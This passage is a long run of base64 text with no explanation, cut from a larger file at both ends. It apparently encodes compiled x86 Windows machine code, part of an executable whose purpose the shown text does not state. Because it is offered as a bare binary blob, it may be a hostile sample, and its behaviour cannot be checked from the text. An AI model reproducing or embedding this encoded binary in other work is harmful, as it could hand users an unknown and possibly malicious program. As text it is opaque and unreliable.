FgAAWVlQV2hUA0EA6K8WAABZWVCNhfj7//9Q6LtdAACDxAyNhfj7//9Q/3UI6GBZAAD/dfxX
VugIAAAAg8QUX15bycNVi+yB7GACAACDfQwEU1ZXD4SZAQAAM9tT6JYpAACoAVm+qAVBAHUg
g30MA3QaU+iAKQAAg+ABg8AIUFboOxYAAIPEDIv46wW/oDFBAP91EGikA0EA6CIWAABZWVBX
/3UMaFQDQQDoERYAAFlZUI2FaP7//1DoHV0AAFPoNCkAAIPgAYPAEFBW6O8VAACDxBxQU+gd
KQAAagMz0ln38YPCElJW6NQVAACDxAxQag9W6MgVAABZWVCNhTD///9Q6NRcAABT6OsoAACD
xBSoAXUmU+jeKAAAg+ABUGgQA0EA6JgVAABQi0UIBawBAABQ6FtYAACDxBSLRQhqDlaNuKwB
AACJfRDochUAAFBX6E1YAACNhWj+//9QV+hAWAAAg8QYOV0Mv3YHQQB1ZFf/dRDoKlgAAGgz
CUEA/3UQ6B1YAACLdQhTaHQNQQCJnhwJAACJniAJAADoURUAAFOJRfyBxrAGAADoSigAADPS
93X8Umh0DUEA6AIVAABQVujNVwAAaNwBQQBW6NJXAACDxDRX/3UQ6MZXAACNhTD///9Q/3UQ
6LdXAACDxBDpVgIAADPbU+j9JwAAg+ABvlgFQQCJRfyLRQhTVomYHAkAAImYIAkAAOjUFAAA
U4v46NQnAAAz0vf3UlbokRQAAIlF+FCNhWj+//9Q6FNXAABT6LMnAACDxCS+qAVBAKgBdAnH
RQygMUEA6xlT6JgnAACD4AGDwAhQVuhTFAAAg8QMiUUM/3UMagRW6EIUAABZWVCNhTD///9Q
6E5bAACNhTD///9QjYVo/v//UOgCVwAAi30QV2ikA0EA6BIUAACDxByJRRBQagRoVANBAOj/
EwAAWVlQjYUw////UOgLWwAAjYUw////UI2FaP7//1Dov1YAAP91EI2FMP///1DooFYAACs9
ANJAAIPHBldW6L4TAACDxCRQ/3UMagVW6K8TAABZWVCNhaD9//9Q6LtaAACNhaD9//9QjYUw
////UOhvVgAAi0UIg8QYOV38dC6NjWj+//8FrAEAAFFQ6EJWAACLRQi/dgdBAAWsAQAAV1Do
PlYAAI2FMP///+ssjY0w////BawBAABRUOgUVgAAi0UIv3YHQQAFrAEAAFdQ6BBWAACNhWj+
//9Qi0UIBawBAABQ6PtVAACLRQiDxBgFrAEAAFdQ6OlVAACLRQhXjbisAQAAV+jZVQAAag1W
6O8SAABQV+jKVQAAagpW6OASAABQV+i7VQAAagtW6NESAABQV+isVQAAg8RA/3X4V+igVQAA
agxW6LYSAABQV+iRVQAAi0UIU4mYHAkAAI2wsAYAAOjSJQAAg+ABUGh0DUEA6IwSAABQVuhX
VQAAaNwBQQBW6FxVAACDxDRfXlvJw4PsZFOLXCRsVVaNq8gAAABXjbOsAQAAVWioBUEAVuhq
WQAAv3YHQQBXVuglVQAAV1boHlUAAGiQBUEAVugTVQAAjUNkUFboCVUAAFdW6AJVAABqAWiQ
BUEA6BQSAABQVujvVAAAg8REVVbo5VQAAFdW6N5UAABqAmiQBUEA6PARAABQVujLVAAA/7Qk
nAAAAFbovlQAAFdW6LdUAABqAOgGJQAAg+ABv6gFQQBAUFfovhEAAFBW6JlUAACDxERqA1fo
rBEAAFBW6IdUAACNRCQgUI1DZGoAUOjPGAAAagFofQdBAOiJEQAAUFXoVFQAAI1EJDxQVehZ
VAAAg8Q0g6McCQAAAF9eXVuDxGTDVYvsgexoCAAAU1ZXi30MaJAFQQBX6B1UAACLXQiNhZj3
//9QjYWY+///jbPIAAAAUFboaBgAAI2FmPv//1ZQjYWY9///aCsNQQBQ6DBYAACNhZj3//9Q
V+jqUwAAvn0HQQBWV+jeUwAAagFokAVBAOjwEAAAUFfoy1MAAIPERI1DZFBX6L5TAABWV+i3
UwAAagJokAVBAOjJEAAAUFfopFMAAI2DLAEAAFBX6JdTAABWV+iQUwAAaJ0HQQBX6IVTAACN
g7gIAABQV4lFDOh1UwAAg8RAVlfoa1MAAFZX6GRTAABqB2oUjUWYaghQ6CQTAABqAf91DFfo
NQIAAIPELIO7HAkAAACLxnQejUWYUI2FmPf//2j7CEEAUOhgVwAAg8QMjYWY9///UI2FmPv/
/2jhB0EAUOhFVwAAjYWY+///UFfo/1IAAI2DrAEAAFBX6PJSAABoTwhBAFfo51IAAFZX6OBS
AABWV+jZUgAAagDoKCMAAIPEOIPgAYO7HAkAAACJRQh1B8dFCAIAAABqAf91DFfomQEAAIPE
DI1FmFCNg7AGAABQ/3UIaMEIQQDosQ8AAFlZUI2FmPv//2hnCEEAUOi4VgAAjYWY+///UFfo
clIAAFZX6GtSAABWV+hkUgAAjUX8agFQjYOsBQAAUOi6HAAAg8Q4iUUIhcB0ElBX6EFSAAD/
dQjoxFYAAIPEDFZX6C9SAACBw7QHAABZWYA7AA+E6wAAAFPozhgAAD0AyAAAWYlF/HIbPQDQ
BwAPg88AAABqAOhRIgAAqAFZD4S/AAAAjUX8agBQU+hOHAAAg8QMiUUIhcAPhKUAAABqAf91
DFfouAAAAGoB/3UMV+itAAAAjYWY+///UI2FmPf//1BqAGoAU+gFUwAAjYWY+///UI2FmPf/
/1Dol1EAAIPENI1FmFCNhZj3//9QagJowQhBAOibDgAAWVlQjYWY+///aGcIQQBQ6KJVAACN
hZj7//9QV+hcUQAAVlfoVVEAAFZX6E5RAAD/dQhX6EVRAABWV+g+UQAA/3UI6MFVAACDxEBq
AP91DFfoEwAAAGhA8EAAV+gdUQAAg8QUX15bycNVi+xoQPBAAP91COgFUQAA/3UM/3UI6PpQ
AACDxBCDfRAAdA9ofQdBAP91COjkUAAAWVldw1WL7IPsMFNWV/8V1NBAAIt9CDPbUFNo/w8f
AIld8MdF9DIAAACJXfiIXdiIXdmIXdqIXduIXdzGRd0FiV3oiV3siV38iV3kiR//FSDRQACN
TfCJReBRaghQ/xUg0EAAhcB1Dv8V4NBAAIlF/OkSAQAA/3X0U/8VlNBAADvDiUX4dOGNTfRR
/3X0UGoC/3Xw/xUw0EAAizXg0EAAhcB1OP/Wg/h6dWv/dfj/FdzQQAD/dfRT/xWU0EAAO8OJ
Rfh0UY1N9FH/dfRQagL/dfD/FTDQQACFwHQ6jUXoUFNTU1NTU1NqBI1F2GoBUP8VKNBAAIXA
dB2NRexQU1NTU1NTU2oGjUXYagFQ/xUo0EAAhcB1B//W6VH///+LdfiJXQg5HnZSg8YE/3Xo
iwaLTgSJRdBQiU3U/xUs0EAAhcB1Iv917P910P8VLNBAAIXAdR3/RQiLRfiLTQiDxgg7CHLH
6xTHReQBAAAAiR/rCccHAQAAAIld5DkfdQs5XeR1BscHAQAAADld7Is1PNBAAHQF/3Xs/9Y5
Xeh0Bf916P/WOV34dAn/dfj/FdzQQAA5XfCLNSTRQAB0Bf918P/WOV3gdAX/deD/1otF/F9e
W8nDVYvsuOAtAADoBlcAAFMz2zldEFZXx0X8IAAAAIideP///3QT/3UQjYV4////UOjQTgAA
WVnrFWoHagqNhXj///9qBVDomQ4AAIPEEDldGHQF/3UY6wVo5DVJAI2FePr//1DonE4AAIt1
CFlZjYV0/v//VlDoik4AAP91DI2FdP7//1Doi04AAIPEEDldFHQT/3UUjYVw/f//UOhkTgAA
WVnrImoBaNwBQQDoQ1YAAGoCmVn3+Y2FcP3//1JQ6FIZAACDxBA5HfA4SQB0HmoBU+gdVgAA
agKZWff5jYVw/f//UlDoLBkAAIPEEI2FdP7//1Do/E4AAIC8BXP+//9cjYQFc/7//1l1AogY
gL1w/f//XHQTjYV0/v//aETwQABQ6O5NAABZWY2FcP3//1CNhXT+//9Q6NlNAABZjYV0/v//
WVNQjYV4+v//UP8VfNBAAIXAD4RlAQAA6JRVAABqBZlZ9/mF0nQi6IVVAACZuQAoAAD3+Y2F
dP7//4HCgFABAFJQ6JkWAABZWWh6IgAAjYUg0v//aMDwQABQ6BNSAACNhSDS//+InTTi//9Q
jYV0/v//UOj/LAAAjYV0/v//UOgQKwAAg8QYOR3wOEkAD4XqAAAAjUX8UI1F3FD/FWTQQACN
RdxQjUYCUOjkngAAWYXAWQ+ExQAAAGoCU1aLNQDQQAD/1ov4O/t1CTldHA+EqgAAAFNTU1ON
hXT+//9TUFNqA2gQAQAAjYV4////U1CNhXj///9QV/8VSNBAAFeLPUDQQAD/12oBU/91CP/W
i/CNhXj///9qEFBW/xU40EAAU1NQiUUQ/xUk0EAA/3UQiUUY/9dW/9c5XRgPhWUBAAC6gQAA
ADPAi8qNvab2//9miZ2k9v//ZomdnPT///OrZquLyjPAjb2e9P//OR0EOUkA86uJXRCJXRhm
q3UHM8DpJAEAAItFDIA4XHUHx0UYAQAAAL8EAQAAjYWk9v//V4s1eNBAAFBq//91CGoBU//W
i00MjYWc9P//V1CLRRhq/wPBUGoBU//WjUUQUI2FnPT//2oCUI2FpPb//1D/FQQ5SQCFwA+F
uwAAAFNTjYV8+///V1CLRRBq/4idfPv///9wGFNT/xWg0EAAjUUUUGgCAACA/3UI/xUc0EAA
hcB1d42FrPj//2oDUOgnEQAAjYV8+///aETwQABQ6JNLAACNhXD9//9QjYV8+///UOiASwAA
jYV0+f//U1BTjYV8+///U1CInXT5///ov0wAAI2FfPv//1CNhXT5//9QjYWs+P//UP91FOgy
GgAAg8Q8/3UU/xVc0EAAoQw5SQA7w3QF/3UQ/9BqAVhfXlvJw1WL7ItFFFNWi/FXM9v/dQiJ
RhiNRhyJHlCJXgzo9EoAAIt9EGaLRQxXZomGnAEAAGbHhp4BAAAZAOgWUwAAg8QMO8OJRgR1
DMeGpAEAAAIAAIDrY1fo+lIAADvDWYlGEHTmV1P/dgSJfgiJfhToQ0oAAFdT/3YQ6DlKAACD
xBiNjqABAACJnqQBAACJnqgBAABqAWoB/3UMiZ6sAQAAiJ4cAQAA6D4FAACFwHUOx4akAQAA
BQAAgDPA6xA5Xgx0CDkedARqAesCagJYX15bXcIQAFaL8VeLRgSFwHQHUOjNTgAAWYtGEIXA
dAdQ6L9OAABZjb6gAQAAagBqBmhI8EAAi8/ojAUAAIvP6MEFAACFwHT1g/gBdRBo3QAAAIvO
6NUCAACL8OsDagFei8/okAUAAIvGX17DVovxV2aLhpwBAACNvqABAABQjUYcUIvP6N0EAACF
wHUNuAEAAICJhqQBAADrK4vP6GQFAACFwHT1g/gBdQ5o3AAAAIvO6HgCAADrDWoBx4akAQAA
AwAAgFhfXsNVi+yB7AQBAABTVovxV42GHAEAAFCNhfz+//9oYPBAAFDopU0AAIPEDI2F/P7/
/42+oAEAAGoAUOg1SgAAWVCNhfz+//9Qi8/otAQAAIvP6OkEAACFwHT1g/gBD4WdAAAAu/oA
AACLzlPo+AEAAIXAD4WVAAAAi87olQAAAIXAD4WGAAAAIUX8OQaLfgR2IVeLzug1AQAAhcB1
cFfo0UkAAP9F/I18BwGLRfxZOwZy32oAjb6gAQAAagdoWPBAAIvP6DsEAABoYgEAAIvO6JQB
AACFwHU1UIvP/3UM/3UI6B0EAABqAGoFaFDwQACLz+gNBAAAU4vO6GoBAADrDWoBx4akAQAA
AwAAgFhfXlvJwggAU1aL8YtGFIPAZFDon1AAAIvYWYXbdQhqAljpmAAAAFVXaHDwQABT6ERI
AACLfhAz7TluDFlZdiVXU+hBSAAAaDjwQABT6DZIAABX6BBJAACDxBRFO24MjXwHAXLbaGzw
QABT6BhIAABZjb6gAQAAWWoAU+joSAAAWVBTi8/obQMAAIvP6KIDAACL6IXtdPNT6HZMAABZ
agFYXzvoXXUOaPoAAACLzuipAAAA6wrHhqQBAAADAACAXlvDU1b/dCQMi9nomUgAAIPAZFDo
308AAIvwWYX2WXUFagJY63JVV2iA8EAAVuiGRwAA/3QkHFbojEcAAGhs8EAAVuiBRwAAg8QY
jbugAQAAagBW6FBIAABZUFaLz+jVAgAAi8/oCgMAAIvohe1081bo3ksAAFlqAVhfO+hddQ5o
+gAAAIvL6BEAAADrCseDpAEAAAMAAIBeW8IEAFWL7IHsBAQAAFaL8VdqAI2+oAEAAI2F/Pv/
/2gABAAAUIvP6IoCAACLz+ioAgAAhcB09YP4AXVAjUX8UI2F/Pv//2iM8EAAUOgcTwAAi0UI
i038g8QMO8F0GseGpAEAAAQAAICJjqgBAACJhqwBAABqAusQM8DrDceGpAEAAAMAAIBqAVhf
XsnCBAD/dCQEgcEcAQAAUeiBRgAAWVnCBABVi+xRU1ZXi/H/dQiLfhDoWEcAAINl/ACDfgwA
WYvYdhZX6EVHAAD/RfyNfAcBi0X8WTtGDHLqK14Qi0YUA9872HZOi04YA8FQiUYU6GpOAACL
2FmF23UMx4akAQAAAgAAgOs+/3YUagBT6K1FAACLRhCLzyvIUVBT6I5OAACLRhBQK/jojkoA
AIPEHIleEAP7/3UIV+jiRQAA/0YMi0YMWVlfXlvJwgQAVYvsUVNWV4vx/3UIi34E6K9GAACD
ZfwAgz4AWYvYdhVX6J1GAAD/RfyNfAcBi0X8WTsGcusrXgSLRggD3zvYdk6LThgDwVCJRgjo
w00AAIvYWYXbdQzHhqQBAAACAACA6zz/dghqAFPoBkUAAItGBIvPK8hRUFPo500AAItGBFAr
+OjnSQAAg8QciV4EA/v/dQhX6DtFAAD/BosGWVlfXlvJwgQAVYvsgeyQAQAAU1ZqAY2FcP7/
/1uL8VBqAv8V4NFAAA+/RQxISHUDagJbD7/DagZQagL/FeTRQAAzyYP4/4kGXg+VwYvBW8nC
DABVi+yD7BBWi/H/dQz/FdTRQABmiUXyjUUMUIvO/3UIZsdF8AIA6HkAAACLRQxqEIhF9IpF
DohF9opFD4hl9YhF941F8FD/Nv8V2NFAAIXAXnQK/xXc0UAAM8DrA2oBWMnCCAD/dCQM/3Qk
DP90JAz/Mf8V0NFAAMIMAP90JAz/dCQM/3QkDP8x/xXM0UAAwgwA/zH/FcTRQAD/JcjRQABq
AVjDVYvsUVFTVleLfQhqATP2W4lN+FeJdfzoFUUAAIXAWX4sigQ+PC51Bf9F/OsKPDB8BDw5
fgIz21dG6PNEAAA78Fl83oXbdBiDffwDdAQzwOs6/3UMi034V+g1AAAA6ylX/xXA0UAAi/D/
FdzRQACF9nQWM8CLTgyLVQyLCYoMAYgMEECD+AR87GoBWF9eW8nCCABVi+xRU4tdCFYz9leJ
dfyNRQiNPB5QaIzwQABX6NtLAACLVQyLRfyKTQiDxAyD+AOIDBB0F0aAPy50CIoEHkY8LnX4
/0X8g338BHzDX15bycIIAFWL7FFTVlf/dQzoPUQAAIt1CItdEFmJRfxW6C1EAACL+FmF/3Qt
hdt0CYvGK0UIO8N9IIN9FAB0D/91DFbo6pQAAFmFwFl0Bo10PgHry4PI/+syi038i8YrRQiN
RAgCO8N+CIXbdAQzwOsa/3UMVujoQgAAVujSQwAAg8QMgGQwAQBqAVhfXlvJw1aLdCQIVzP/
OXwkEH4dVuiuQwAAhcBZdBJW6KNDAABHWTt8JBCNdAYBfOOLxl9ew1aLdCQIVzP/VuiEQwAA
hcBZdBqDfCQQAHQMi84rTCQMO0wkEH0HjXQGAUfr24vHX17DVYvsUVOLXQhWi3UMV2oAU4l1
/Oi2////i/hZhf9ZfwczwOmVAAAAhfZ9D2oA6KQSAAAz0ln394lV/I1HAlBT6Fr///+L8Cvz
0eZW6F9KAABWM/ZWUIlFDOizQQAAg8QYhf9+JDt1/HQaagH/dRBWU+gp////WVlQ/3UM6JT+
//+DxBBGO/d83DP2Tzv+iTN+H2oB/3UQVv91DOj//v//WVlQU+hs/v//g8QQRjv3fOH/dQzo
U0YAAFlqAVhfXlvJw1ZXM/+L92oA994b9oHm+AAAAIPGCOj7EQAAM9JZ9/aLRCQMA8eE0ogQ
dQPGAAFHg/8EfNBfXsNVi+yD7AyLRRCDZfgAg30MAFOKCIpAAVZXiE3+iEX/fjOLRQiLTfgD
wYlF9IoAiEUTYIpFE4pN/tLAMkX/iEUTYYtN9IpFE/9F+IgBi0X4O0UMfM1qAVhfXlvJw1WL
7IPsDItFEINl+ACDfQwAU4oIikABVleITf6IRf9+M4tFCItN+APBiUX0igCIRRNgikUTik3+
MkX/0siIRRNhi030ikUT/0X4iAGLRfg7RQx8zWoBWF9eW8nDU1ZXM/9X6BsRAABZM9JqGotc
JBRZ9/GL8oPGYYP7BHR4g/sBdRVX6PoQAABZM9JqCln38YvCg8Aw62D2wwJ0E1fo4BAAAFkz
0moaWffxi/KDxkFX6M0QAACoAVl0GPbDBHQTV+i9EAAAWTPSahpZ9/GL8oPGYVfoqhAAAKgB
WXQY9sMBdBNX6JoQAABZM9JqCln38Yvyg8Ywi8ZfXlvDU4tcJAxWV4t8JBiL8zv7fhJqAOhv
EAAAK/sz0vf3WYvyA/OLXCQQM/+F9n4S/3QkHOgr////iAQfRzv+WXzuagLoG////1mIA4Ak
HwBqAVhfXlvDVle/kPBAADP2V+iuQAAAhcBZfhiKRCQMOoaQ8EAAdBFXRuiWQAAAO/BZfOgz
wF9ew2oBWOv4U4pcJAhWV4TbfD8PvvNW6EhLAACFwFl1NVboa0sAAIXAWXUqv5jwQAAz9lfo
VkAAAIXAWX4UOp6Y8EAAdBBXRuhCQAAAO/BZfOwzwOsDagFYX15bw1aLdCQIigZQ/xVo0EAA
hcB0C4B+AYB2BWoBWF7DM8Bew4tEJASKADyhdAc8o3QDM8DDagFYw1WL7IHs/AcAAItFHFNW
V4t9DDP2iXX8gCcAOXUQiTB/CYtFCEDp3AEAAItdCIoDUOhA////hcBZdVCJXQyDfSAAdCv/
dQzof////4XAWXQN/3UM6JP///+FwFl0Lf91DOiG////hcBZdARG/0UMi0UQRv9FDEg78H0Q
i0UMigBQ6PD+//+FwFl0s4tFEEg78IlFDA+NagEAAIoEHlDo0/7//4XAWQ+EvgAAAIoEHlDo
i/7//4XAWXULRjt1DHzs6T8BAACKBB5Q6Kj+//+FwFl0G4tN/IoEHv9F/EY7dQyIBDl9CYtF
GEg5Rfx814tFGEg5Rfx8HIN9/AB0FotF/IoEOFDoN/7//4XAWXUF/038deqLRfyFwHwEgCQ4
ADPbOB90FYoEO1DoE/7//4XAWXQHQ4A8OwB1640EO1CNhQT4//9Q6MQ9AACNhQT4//9QV+i3
PQAAi0X8g8QQK8M7RRQPjYQAAACLXQiDfSAAD4SKAAAAi0UIgCcAA8Yz21DoR/7//4XAWXRZ
i0UQg8D+iUUgi0UIA8aJRRD/dRDoSv7//4XAWXUZi0UQigiIDDuKSAFDRkCIDDtDRkCJRRDr
BkZGg0UQAjt1IH0Xi0UYg8D+O9h9Df91EOju/f//hcBZdbiAJDsAO10UfBCLRRzHAAEAAACL
RQgDxusMi10Ii0UcgyAAjQQeX15bycNVi+y4HBAAAOgERQAAU1ZXjU3k6OTc//+LfQyNRfhq
AVD/dQgz241N5Igf6M/c//+L8DvzD4QrAQAAi1X4g/oKD4IXAQAAiJ3k7///iV38/3UYjU38
Uf91FP91EFJXUOiR/f//i034g8Qci9Er0APWg/oFD47iAAAAOV38dNGJXQgz//91GI1V/CvI
UgPO/3UU/3UQUY2N5O///1FQ6FP9//+DxBw5Xfx0A/9FCItN+IvRK9AD1oP6BXYJR4H/ECcA
AHy/OV0IdBFT6JgMAAAz0ln394tN+IlVCIv+iV30/3UYjUX8K89QA87/dRSNheTv////dRBR
UFfo9/z//4PEHDld/Iv4dBk5XQh0Lv9NCI2F5O///1D/dQzo4jsAAFlZi034i8ErxwPGg/gF
dgz/RfSBffQQJwAAfKSNTeTodtz///91DOimPAAAWTPJO0UQD53Bi8FfXlvJw4gfjU3k6FTc
//8zwOvtVYvsi1UMUzPbVoXSdAIgGotFEIXAdAOAIACLdQiAPkB0HFeL+ovGK/6KCITJdA6F
0nQDiAwHQ0CAOEB17F+F0nQEgCQTAIA8MwCNBDNeW3UEM8Bdw4N9EAB0C1D/dRDoNDsAAFlZ
agFYXcNVi+xRU4pdCFZXvqTwQACNffxmpYD7IKR+NID7fn0vD77zVujKRgAAhcBZdShW6O1G
AACFwFl1HYD7QHQYgPsudBM6XAX8dA1Ag/gCfPQzwF9eW8nDagFY6/b/dCQE6J3///9Zw1WL
7LgAIAAA6MtCAAD/dQiNhQDg//9Q6Kw6AAD/dQyNhQDw//9Q6J06AACNhQDg//9Q6O2MAACN
hQDw//9Q6OGMAACNhQDw//9QjYUA4P//UOjCRgAAg8QgycNWvlICQQBW/3QkDOhdOgAA/3Qk
FFbogff//1D/dCQc6Fk6AACDxBhew1OLXCQIVldT6Cc7AACL+FmD/wR8JIP/DH8fM/aF/34U
D74EHlDoDUYAAIXAWXQKRjv3fOxqAVjrAjPAX15bw1WL7IHsBAEAAFNWV42F/P7//zP/UFdX
V/91COhQOwAAvvwBQQBXVug39///i9iDxBw7334gV1bo9/b//1CNhfz+//9Q6IyLAACDxBCF
wHQnRzv7fOCNhfz+//9owg1BAFDob4sAAPfYG8BZg+BjWYPAnF9eW8nDi8fr91WL7FYz9ldW
aiBqAlZqA2gAAADA/3UI/xX80EAAi/iJdQiD//90Izl1DHQejUUIVlD/dRD/dQxX/xVs0EAA
V/8VJNFAAGoBWOsCM8BfXl3DVYvsU1dqAGonagNqAGoDaAAAAID/dQj/FfzQQACDZQgAi/iD
y/87+3QdjUUIUFf/FezQQACDfQgAi9h0A4PL/1f/FSTRQACLw19bXcNVi+yD7BSNTezo2tj/
/41F/GoBUI1N7P91COjM2P//hcB0DY1N7Oh62f//agFYycMzwMnDVYvsgewYAQAAVmoEagWN
RexqAlDof/j//4PEEI2F6P7//1BoBAEAAP8VmNBAAIt1CI1F7FZqAFCNhej+//9Q/xV00EAA
VugjAAAAVuhYOQAAWVlIeAaAPDAudfcDxmjcAUEAUOhQOAAAWVleycNqIP90JAj/FYDQQAD/
dCQE/xWc0EAAw1WL7IHsSAMAAFZX/3UIjYX4/f//M/ZQ6Bg4AACNhfj9//9Q6Pw4AACDxAyF
wHQXgLwF9/3//1yNhAX3/f//dQaAIABqAV6Nhfj9//9osPBAAFDo7TcAAFmNhbj8//9ZUI2F
+P3//1D/FYzQQACL+IP//w+E1AAAAP91CI2F/P7//1DorTcAAFmF9ll1E42F/P7//2hE8EAA
UOimNwAAWVmNheT8//9QjYX8/v//UOiRNwAA9oW4/P//EFlZdFuNheT8//9orPBAAFDodTYA
AFmFwFl0Wo2F5Pz//2io8EAAUOheNgAAWYXAWXRD/3UQjYX8/v//agFQ/1UMg8QMhcB0Lf91
EI2F/P7///91DFDo7P7//4PEDOsW/3UQjYX8/v//agBQ/1UMg8QMhcB0Fo2FuPz//1BX/xWI
0EAAhcAPhTP///9X/xWE0EAAXzPAXsnDVYvsUYF9DABQAQBTVld8Kmog/3UI/xWA0EAAM9tT
aiBqA1NqA2gAAADA/3UI/xX80EAAi/iD//91BzPA6YQAAACNRfxQV/8V7NBAAIvwO3UMfhVT
U/91DFf/FeTQQABX/xWQ0EAA61NqAlNTV/8V5NBAAItFDCvGvgAACACJRQiLzpn3+TvDix1s
0EAAfheJRQyNRfxqAFBWaNAxQQBX/9P/TQx17I1F/GoAUItFCJn3/lJo0DFBAFf/01f/FSTR
QABqAVhfXlvJw1ZqAGonagNqAGoDaAAAAID/dCQg/xX80EAAi/CD/v91BDPAXsOLRCQMV41I
EFGNSAhRUFb/FejQQABWi/j/FSTRQACLx19ew1ZqAGonagNqAGoDaAAAAMD/dCQg/xX80EAA
i/CD/v91BDPAXsOLRCQMV41IEFGNSAhRUFb/FTDRQABWi/j/FSTRQACLx19ew1WL7IPsFFON
TezodNX//41F/GoBUI1N7P91COhm1f//i9iF23Rwg30QAHQmgX38AJABAHYdagDosgUAAFkz
0moKWffxg8JUweIKO1X8cwOJVfyLRfxWA8BQ6Gk9AACL8FmF9nQmi0X8A8BQagBW6LU0AABq
SP91/FZT6LnN//+LTQyDxByFyXQCiQGNTezordX//4vGXlvJw1WL7IHsBAEAAFNWV4t9CDPb
ahRTV4id/P7//+hvNAAAg8QMOB3sN0kAdD5T6CQFAABZM9JqA1n38YXSdCxqAWoKjYX8/v//
UVBo7DdJAOib9///g8QUhcB0D42F/P7//1BX6Ig0AABZWTgfD4WLAAAAOB3oNkkAdDZT6NYE
AABZM9JqA1n38YXSdCSNhfz+//9TUFNTaOg2SQDouzUAAI2F/P7//1BX6EM0AACDxBw4H3VJ
U+icBAAAqA9ZdSu+dA1BAFNW6IPx//9TiUUI6IIEAAAz0vd1CFJW6D7x//9QV+gJNAAAg8Qc
OB91D2oEagZqAlfo1fP//4PEEDldDHQrvvwBQQBTVuhA8f//U4lFCOg/BAAAM9L3dQhSVuj7
8P//UFfo1jMAAIPEHDldEHQN/3UQV+jFMwAAWVnrMDldFHQrvtwBQQBTVuj+8P//U4lFCOj9
AwAAM9L3dQhSVui58P//UFfolDMAAIPEHF9eW8nDVYvsg+wUU4tFGFZX/3UUM9uDz/+JXfxT
iX34/3UQiV3wiV30iRjo8TIAAIt1CIoGUOgZ+P//g8QQhcAPhIwAAACKBlDoBvj//4XAWXRc
i0UMi95IiUUIi0UQK8aJRezrA4tF7IoLiAwYigM8QHUJi03w/0X0iU34PC51B4X/fQOLffD/
RfxDi0X8/0XwO0UIfRaLRRRIOUXwfQ2KA1DorPf//4XAWXW5M9uLRfCLTRArffiAJAgAg/8D
fhFqAVg5Rfh+CTlF9A+EoAAAAINN+P+DTfD/iV38ZoseM/9TIX306MP3//+FwFkPhIoAAABT
6LT3//+FwFl0VItFDEghfQyJRQiLRRCA+0CIHAd1Bv9F9Il9+ID7LnUJg33wAH0DiX3wg0UM
BINF/AKLRQxHO0UIfRqLRRRIO/h9EotF/GaLHDBT6GD3//+FwFl1totFEIAkBwCLRfArRfiD
+AJ+EmoBWDlF+H4KOUX0dQWLTRiJAYtF/APG6wONRgFfXlvJw1WL7IHsGAQAAFMz21aNTeiJ
Xfzo3tH//41F+GoBUI1N6P91COjQ0f//i/A783UEM8DrY1eL/otF+IvPK86NUP87yn1HjU38
K8dRjY3o+///aAAEAACNRDD/UVBX6B7+//+DxBSDffwAi/h0yv91FI2F6Pv///91EFD/dQzo
Hu7//4PEEIXAfq5D66uNTejoINL//4vDX15bycNVi+xRUYtFGINN+P9QagD/dRSJRfzo5zAA
AIPEDI1FGFD/dQz/dQj/FUzQQACFwHQFagFYycONRfxQjUX4/3UUUGoA/3UQ/3UY/xUU0EAA
/3UY/xVc0EAAM8DJw1WL7I1FDFD/dQz/dQj/FRjQQACFwHQFagFYXcP/dRTo0TEAAFlQ/3UU
agFqAP91EP91DP8VENBAAP91DP8VXNBAADPAXcNVi+yB7AwBAACNRfxWUDP2/3UM/3UI/xVM
0EAAhcB0BDPA61eNhfT+//9oBAEAAFBW/3X8/xVQ0EAAhcB1LzlFEHQjIUX4/3UUjUX4UI2F
9P7//1D/dQz/dQj/VRCDxBSDffgAdQNG67uL8OsDagFe/3X8/xVc0EAAi8ZeycNVi+yB7BQI
AABTjUX8VlD/dQy+AAQAADPbiXXw/3UIiXX4/xVM0EAAhcB0BDPA63ONRfiJdfBQjYXs9///
UI1F7FCNRfBqAFCNhez7//+JdfhQU/91/P8VRNBAAIXAdTWDfewBdSg5RRB0IyFF9P91FI1F
9FCNhez7//9Q/3UM/3UI/1UQg8QUg330AHUDQ+ufi/DrA2oBXv91/P8VXNBAAIvGXlvJw4N8
JAQAdQmDPcwxQQAAdRf/FTTRQABQ6GM3AABZ6Gc3AACjzDFBAOldNwAAVYvsg+xUVjP2akSN
RaxWUOj5LgAAg8QMjUXwx0WsRAAAAFCNRaxQVlZWVlZW/3UM/3UI/xWk0EAA99gbwF4jRfDJ
w1WL7IPsHFNWjU3k6BbP//+DZfgAvsDwQABW6PwvAABZiUX0jUX8agFQjU3k/3UI6PXO//+L
2IXbdFOLTfxXgfkAoAAAcju4ABAAAIHBGPz//zvIi/h2Kv919I0EH1BW6Jc7AACDxAyFwHQP
i0X8RwUY/P//O/hy3+sHx0X4AQAAAI1N5Ohaz///i0X4X15bycNVi+yB7AAEAABojQdBAP91
EOi88///WYXAWXRzjYUA/P//aAAEAABQgKUA/P//AP91EP91DP91COj8/P//jYUA/P//UOgm
////g8QYhcB0P4tNGGoBWP91DIkBi00UaOA0SQCJAegwLgAAjYUA/P//UGjkNUkA6B8uAAD/
dRBo3DNJAOgSLgAAg8QYM8DJw2oBWMnDVYvsgewACAAA/3UMjYUA/P//UOjuLQAAjYUA/P//
aETwQABQ6O0tAAD/dRCNhQD8//9Q6N4tAACNhQD8//9ojQdBAFDo9fL//4PEIIXAdHmNhQD4
//+ApQD4//8AaAAEAABQjYUA/P//aJMHQQBQ/3UI6C78//+NhQD4//9Q6Fj+//+DxBiFwHQ/
i00YagFY/3UMiQGLTRRo4DRJAIkB6GItAACNhQD4//9QaOQ1SQDoUS0AAP91EGjcM0kA6EQt
AACDxBgzwMnDagFYycNVi+yB7BwFAACDZfwAgz3wOEkAAHUlagRoUgJBAOhE6v//jU38UWhK
SUAAUGgCAACA6EP8//+DxBjrPI2F6Pv//2oCUOiC8v//jYXo+///UGjgNEkA6N4sAACNRfxQ
jYXo+///aLZIQABQaAIAAIDog/z//4PEIItF/IXAo/Q4SQAPhdEAAABWjYXk+v//aAQBAABQ
/xWo0EAAM/aAZegAjUXoaI0HQQBQ6IosAABZjUXoWWoEagRqAlDoaS0AAFmNRAXoUOhN7P//
jUXpUOjBfgAAjYXk+v//UI2F6Pv//1DoUiwAAI2F6Pv//2hE8EAAUOhRLAAAjUXoUI2F6Pv/
/1DoQSwAAI2F6Pv//2jcAUEAUOgwLAAAjYXo+///UOgn8///g8Q4hcB0CkaD/goPjGf///+N
RehQaNwzSQDoBSwAAI2F6Pv//1Bo5DVJAOjkKwAAg8QQXmoBWMnDi0QkBGaLTCQIZgFIAmaL
SAJmg/kBfQ5mg0ACHmaLSAJm/wjr7GaDeAIffhJmg0AC4maLSAJm/wBmg/kff+5miwhmg/kB
